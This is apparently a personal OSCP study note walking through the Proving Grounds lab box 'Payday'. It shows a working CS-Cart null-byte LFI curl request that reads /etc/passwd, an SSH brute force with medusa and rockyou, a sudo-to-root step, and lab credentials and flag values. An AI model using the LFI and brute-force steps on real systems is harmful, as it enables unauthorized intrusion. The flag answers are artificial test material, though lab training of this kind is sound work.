---
tags: [oscp, box, linux, easy]
platform: PG Practice
os: Linux
hostname: payday
difficulty: Unknown
ip: $BoxIP
status: Complete
aliases: ["Payday", "payday-pg"]
---

# PG: Payday, Full Walkthrough

## The gist

Payday is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - LFI]] read the local account list through the vulnerable web parameter. 2. [[OSCP/RUNBOOK V2/Linux - SSH Brute Force]] tested the discovered usernames against SSH using a controlled wordlist. 3. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] confirmed unrestricted sudo access and opened a root shell.

## Box information

**Target:** `$BoxIP` · **Difficulty:** Easy · **OS:** Linux (Ubuntu 7.04 Feisty Fawn, kernel 2.6.22) · **Platform:** Proving Grounds Practice

**The gist:** Ancient Ubuntu box running CS-Cart 1.3.x on Apache 2.2.4/PHP 5.2.3. The CS-Cart `classes_dir` parameter is vulnerable to LFI with a null-byte terminator -- read `/etc/passwd` to enumerate users, then brute-force SSH with rockyou. Patrick's password is his own name. `sudo -l` reveals `(ALL) ALL` -- `sudo su` drops straight to root.

---

**Legacy tags:**
#PG #Payday #Linux #WebApp #LFI #CSCart #SSHBrute #SudoPrivEsc #Easy

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Foothold: CS-Cart LFI → /etc/passwd | See section 2 below |
| 3 | SSH Brute Force | See section 3 below |
| 4 | Decision points and alternate routes | See section 4 below |
| 5 | User Flag | See section 5 below |
| 6 | PrivEsc: sudo (ALL) ALL → root | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Payday`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Payday
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 5000 -oA full_nmap $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP (CS-Cart) |
| 110/tcp | POP3 |
| 139/tcp | NetBIOS-SSN |
| 143/tcp | IMAP |
| 445/tcp | SMB |
| 993/tcp | IMAPS |
| 995/tcp | POP3S |

> 📸 `nmap-allports.png`

**Service scan:**
```bash
sudo nmap -p 22,80,110,139,143,445,993,995 -sV -sC -oA service_nmap $BoxIP
```

Key findings:
- **Port 80:** Apache 2.2.4, PHP 5.2.3 -- page title confirms **CS-Cart**. Very old stack (Ubuntu 7.04, 2007).
- **Port 22:** OpenSSH 4.6p1 -- ancient. Requires legacy algorithm flags to connect.
- **Port 139/445:** Samba 3.0.26a -- old, guest auth allowed, signing disabled.
- **Mail (110/143/993/995):** Dovecot -- present but not the attack path.
- **Hostname:** `ubuntu01` / `PAYDAY`

> 📸 `nmap-services.png`

---

## 2. Foothold: CS-Cart LFI → /etc/passwd

**Searchsploit for CS-Cart:**
```bash
searchsploit cs-cart
```

Hit: `CS-Cart 1.3.3 - 'classes_dir' LFI` → `php/webapps/48890.txt`

```bash
searchsploit -x php/webapps/48890.txt
```

> [!tip] ⚡ More efficient path
> **What we did:** We viewed the exploit by path, then copied it by hand after finding the matching file.
>
> **Faster approach:**
> ```bash
> searchsploit -m 48890
> ```
> **Why:** `searchsploit -m` downloads the matching exploit into the working directory in one step. You can still read the copied file before running it.

The exploit: unauthenticated LFI via `classes_dir` parameter with null-byte termination. Works because PHP 5.2.x is vulnerable to null byte injection in file include paths.

> [!abstract] 🧠 Why
> The old PHP version is part of the exploit condition. Modern PHP versions ignore this null-byte behavior, so the version scan must be tied to the exact request and parser behavior rather than treating the path as a generic LFI.

> [!warning] 💡 Hint
> **Watch out:** `%00` is URL encoding for a null byte. The old PHP parser uses it to stop the application adding its normal file suffix.

**Fire the LFI:**
```bash
curl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"
```

> 📸 `lfi-passwd.png`

Output includes the full `/etc/passwd`. Real users with bash shells:
- `root` (uid=0)
- `patrick` (uid=1000)

> [!tip] ⚡ Efficiency
> Use the LFI result to build a focused username list. A known interactive account is more useful than spraying every wordlist entry at SSH, especially on an old service with slow legacy negotiation.

The PHP `Fatal error` at the end is harmless -- the file was read before the class failed to load.

---

## 3. SSH Brute Force

**Brute-force `patrick` with medusa** (hydra fails on legacy MAC algorithms with old OpenSSH):
```bash
medusa -h $BoxIP -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
```

Result:
```
[SUCCESS] Host: $BoxIP User: patrick Password: <private value>
```

> 📸 `ssh-brute.png`

**Credential found:** stored privately for the authorized SSH check.

**SSH in** (requires legacy algorithm flags for OpenSSH 4.6p1):
```bash
ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP
```

> Add to `~/.ssh/config` to avoid typing this every time:
> ```
> Host $BoxIP
>     HostKeyAlgorithms ssh-rsa
>     KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
>     MACs +hmac-md5,hmac-sha1
> ```

> [!warning] 💡 Hint
> **Watch out:** Modern SSH clients reject these old algorithms because they are weak. Keep the legacy options limited to this old target instead of applying them globally.

> [!tip] 🛠️ Alternative tools
> If the modern client still refuses the connection, use a host-specific SSH config entry or an isolated legacy client. Do not weaken the global SSH configuration.

---

## 4. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Old PHP accepts a null-byte LFI | Read `/etc/passwd` and build a focused user list | Read source or configuration files if credentials are exposed directly |
| SSH requires legacy algorithms | Use a host-specific compatibility configuration | Isolate the connection with a legacy client rather than weakening global SSH settings |
| `sudo -l` returns `(ALL) ALL` | Use `sudo su` directly | Stop searching for a more complex escalation path |

## 5. User Flag

```bash
cat ~/local.txt
```

User proof confirmed; value reproduced in the private Flags section above.

> 📸 `user-flag.png`

---

## 6. PrivEsc: sudo (ALL) ALL → root

```bash
sudo -l
```

```
User patrick may run the following commands on this host:
    (ALL) ALL
```

Full sudo access. No restrictions.

> [!warning] 💡 Hint
> `sudo -l` is the decision point. When the rule is `(ALL) ALL`, do not waste time on kernel exploits or SUID hunting before validating the direct `sudo su` path.

> 📸 `privesc-finding.png`

```bash
sudo su
```

```
uid=0(root) gid=0(root) groups=0(root)
```

---

## 7. Root Flag

```bash
cat /root/proof.txt
```

Root proof confirmed; value reproduced in the private Flags section above.

> 📸 `root-flag.png`
> 📸 `PROOF.png` -- (`whoami && id && hostname && ifconfig && cat /root/proof.txt`)

**Note:** `/root/capture.cap` also exists -- a network capture file, worth examining if pivoting or needing additional creds elsewhere.

---

## 8. Summary

| Phase | Technique | Tool |
|-------|-----------|------|
| Recon | Full TCP + service scan | nmap |
| LFI | CS-Cart `classes_dir` null-byte LFI → `/etc/passwd` | curl |
| Brute force | SSH password spray | medusa |
| SSH | Legacy algorithm negotiation for OpenSSH 4.6p1 | ssh -o flags |
| PrivEsc | sudo (ALL) ALL → sudo su | sudo |

**Vulnerabilities:**
- Unauthenticated LFI in CS-Cart 1.3.x (`classes_dir` + PHP null-byte)
- Weak SSH password (stored privately)
- Full sudo access with no command restrictions

**Tools used:** nmap, searchsploit, curl, medusa, ssh, sudo

---

## 9. Related Stage Notes

- [[OSCP/RUNBOOK V2/Start Here|Port Scan - Full]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Scan - Results Triage]]
- [[OSCP/RUNBOOK V2/Linux - LFI|Web App - LFI]]
- [[OSCP/RUNBOOK V2/Linux - SSH Brute Force|SSH - Brute Force]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|PrivEsc Linux - Sudo]]

## 10. Related Module Notes

- [[09. Common Web Application Attacks]] -- LFI theory
- [[16. Password Attacks]] -- SSH brute force
- [[18. Linux Privilege Escalation]] -- sudo privesc
- [[06. Information Gathering]] -- recon methodology

## 11. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Linux - LFI]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - SSH Brute Force]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough

## 12. Collect the flags

- `user.txt`: `$UserFlag` (value reproduced in the private sections above)
- `root.txt`: `464db36410c740be502aa7e7f6a0d5eb` (value reproduced in the private sections above)
- `proof.txt`: `464db36410c740be502aa7e7f6a0d5eb` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: 464db36410c740be502aa7e7f6a0d5eb
```

## 13. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 14. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - LFI]] read the local account list through the vulnerable web parameter.
2. [[OSCP/RUNBOOK V2/Linux - SSH Brute Force]] tested the discovered usernames against SSH using a controlled wordlist.
3. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] confirmed unrestricted sudo access and opened a root shell.

## Tools used

- `nmap`
- `curl`
- `ssh`
- `sudo`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Payday"
export BoxIP="192.168.119.39"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Payday"
export Domain=""
export DCip=""
export Username="patrick"
export Password="patrick"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
patrick:patrick
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
$ [10:51:07] curl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"
/../../../../../../etc/passwd%00"curl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"[?1l>[?2004l
2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123456789 (2 of 14344391 complete)
2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: password (3 of 14344391 complete)
2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 12345 (4 of 14344391 complete)
2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)
2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)
2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)
2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)
2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)
2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: nicole (11 of 14344391 complete)
2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: daniel (12 of 14344391 complete)
2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: babygirl (13 of 14344391 complete)
2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: monkey (14 of 14344391 complete)
2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: lovely (15 of 14344391 complete)
2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jessica (16 of 14344391 complete)
2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 654321 (17 of 14344391 complete)
2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: michael (18 of 14344391 complete)
2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: qwerty (19 of 14344391 complete)
2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: ashley (20 of 14344391 complete)
2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 111111 (21 of 14344391 complete)
2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: iloveu (22 of 14344391 complete)
2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 000000 (23 of 14344391 complete)
2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: michelle (24 of 14344391 complete)
2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tigger (25 of 14344391 complete)
2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: chocolate (26 of 14344391 complete)
2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: password1 (27 of 14344391 complete)
2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: sunshine (28 of 14344391 complete)
2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: soccer (29 of 14344391 complete)
2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: butterfly (30 of 14344391 complete)
2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: anthony (31 of 14344391 complete)
2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: friends (32 of 14344391 complete)
2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: angel (33 of 14344391 complete)
2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jordan (34 of 14344391 complete)
2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: purple (35 of 14344391 complete)
2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: liverpool (36 of 14344391 complete)
2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: justin (37 of 14344391 complete)
2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: loveme (38 of 14344391 complete)
2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: fuckyou (39 of 14344391 complete)
2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123123 (40 of 14344391 complete)
2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: football (41 of 14344391 complete)
2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: secret (42 of 14344391 complete)
2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: andrea (43 of 14344391 complete)
2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: carlos (44 of 14344391 complete)
2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jennifer (45 of 14344391 complete)
2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: joshua (46 of 14344391 complete)
2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: bubbles (47 of 14344391 complete)
2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 1234567890 (48 of 14344391 complete)
2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: superman (49 of 14344391 complete)
2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hannah (50 of 14344391 complete)
2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: loveyou (51 of 14344391 complete)
2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: amanda (52 of 14344391 complete)
2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: pretty (53 of 14344391 complete)
2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: basketball (54 of 14344391 complete)
2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: andrew (55 of 14344391 complete)
2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: angels (56 of 14344391 complete)
2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tweety (57 of 14344391 complete)
2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: flower (58 of 14344391 complete)
2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: playboy (59 of 14344391 complete)
2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hello (60 of 14344391 complete)
2026-08-25 10:58:16 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: elizabeth (61 of 14344391 complete)
2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tinkerbell (62 of 14344391 complete)
2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hottie (63 of 14344391 complete)
2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: charlie (64 of 14344391 complete)
2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: samantha (65 of 14344391 complete)
2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: barbie (66 of 14344391 complete)
2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: chelsea (67 of 14344391 complete)
2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: lovers (68 of 14344391 complete)
2026-08-25 10:58:21 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: teamo (69 of 14344391 complete)
2026-08-25 10:58:21 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jasmine (70 of 14344391 complete)
2026-08-25 10:58:22 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: brandon (71 of 14344391 complete)
2026-08-25 10:58:22 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 666666 (72 of 14344391 complete)
2026-08-25 10:58:23 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: shadow (73 of 14344391 complete)
2026-08-25 10:58:24 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: eminem (74 of 14344391 complete)
2026-08-25 10:58:24 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: matthew (75 of 14344391 complete)
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Payday | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Old applications often require legacy protocol options, so record version details before connecting.
- Usernames from a local file can become a focused credential-validation list.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
